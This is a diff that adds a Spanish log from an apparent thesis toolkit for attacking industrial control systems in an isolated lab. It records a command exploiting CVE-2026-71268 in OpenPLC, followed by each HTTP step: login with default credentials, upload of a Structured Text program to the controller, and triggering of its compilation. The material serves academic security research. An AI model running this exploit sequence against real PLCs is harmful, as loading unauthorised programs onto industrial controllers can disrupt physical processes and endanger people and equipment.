@@ -1,0 +1,24 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - CVE-2026-71268 (subida + compilación de .st)
+======================================================================
+  Fecha      : 2026-10-12 17:03:30
+  Objetivo   : 192.168.10.10:8080 prog=CVE-2026-71268-PoC
+  MITRE ICS  : T0843, T0873
+======================================================================
+$ python3 -m modules._cli.openplc_cli cve_2026_71268 --target 192.168.10.10 --port 8080 --user openplc --password openplc --prog-name CVE-2026-71268-PoC --prog-descr PoC TFM --st-file /ataques/work/cve_2026_71268_poc.st
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+    -> HTTP 302
+[+] Sesión establecida.
+[*] Subiendo .st al PLC
+[*]   A) POST http://192.168.10.10:8080/upload-program  (file=cve_2026_71268_poc.st)
+       -> HTTP 200
+       -> Servidor asignó: 983020.st
+[*]   B) POST http://192.168.10.10:8080/upload-program-action  (prog_file=983020.st)
+       -> HTTP 200
+[*] Compilando programa (983020.st)
+[*]   GET http://192.168.10.10:8080/compile-program?file=983020.st
+       -> HTTP 200
+[+]   Compilación exitosa.
+[+] Flujo completado. Revisa el dashboard del PLC para verificar el programa cargado.
+[=] Código de salida: 0
